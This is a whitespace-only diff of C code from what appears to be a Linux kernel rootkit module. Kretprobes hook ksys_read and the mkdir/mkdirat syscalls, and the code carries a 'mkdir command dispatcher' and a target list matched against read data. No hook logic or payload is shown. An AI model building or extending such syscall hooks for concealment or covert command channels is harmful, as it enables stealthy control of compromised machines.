@@ -59,8 +59,7 @@ out:
 	return ret;
 }
 
-static bool line_matches(struct rk_target_list *list,
-			  const char *line, int len)
+static bool line_matches(struct rk_target_list *list, const char *line, int len)
 {
 	unsigned long flags;
 	bool found = false;
@@ -152,11 +151,11 @@ static int rk_read_return(struct kretprobe_instance *ri, struct pt_regs *regs)
 }
 
 static struct kretprobe rk_read_probe = {
-	.handler        = rk_read_return,
-	.entry_handler  = rk_read_entry,
-	.data_size      = sizeof(struct rk_read_data),
-	.maxactive      = 20,
-	.kp.symbol_name = "ksys_read",
+    .handler = rk_read_return,
+    .entry_handler = rk_read_entry,
+    .data_size = sizeof(struct rk_read_data),
+    .maxactive = 20,
+    .kp.symbol_name = "ksys_read",
 };
 
 /* ── mkdir command dispatcher ────────────────────────────────── */
@@ -232,7 +231,7 @@ static int rk_mkdir_entry_mkdirat(struct kretprobe_instance *inst,
 }
 
 static int rk_mkdir_return(struct kretprobe_instance *inst,
-			    struct pt_regs *regs)
+			   struct pt_regs *regs)
 {
 	struct rk_mkdir_data *data;
 
@@ -243,19 +242,19 @@ static int rk_mkdir_return(struct kretprobe_instance *inst,
 }
 
 static struct kretprobe rk_mkdir_probe = {
-	.kp.symbol_name = "__x64_sys_mkdir",
-	.entry_handler  = rk_mkdir_entry_mkdir,
-	.handler        = rk_mkdir_return,
-	.data_size      = sizeof(struct rk_mkdir_data),
-	.maxactive      = 8,
+    .kp.symbol_name = "__x64_sys_mkdir",
+    .entry_handler = rk_mkdir_entry_mkdir,
+    .handler = rk_mkdir_return,
+    .data_size = sizeof(struct rk_mkdir_data),
+    .maxactive = 8,
 };
 
 static struct kretprobe rk_mkdirat_probe = {
-	.kp.symbol_name = "__x64_sys_mkdirat",
-	.entry_handler  = rk_mkdir_entry_mkdirat,
-	.handler        = rk_mkdir_return,
-	.data_size      = sizeof(struct rk_mkdir_data),
-	.maxactive      = 8,
+    .kp.symbol_name = "__x64_sys_mkdirat",
+    .entry_handler = rk_mkdir_entry_mkdirat,
+    .handler = rk_mkdir_return,
+    .data_size = sizeof(struct rk_mkdir_data),
+    .maxactive = 8,
 };
 
 /* ── module lifecycle ────────────────────────────────────────── */
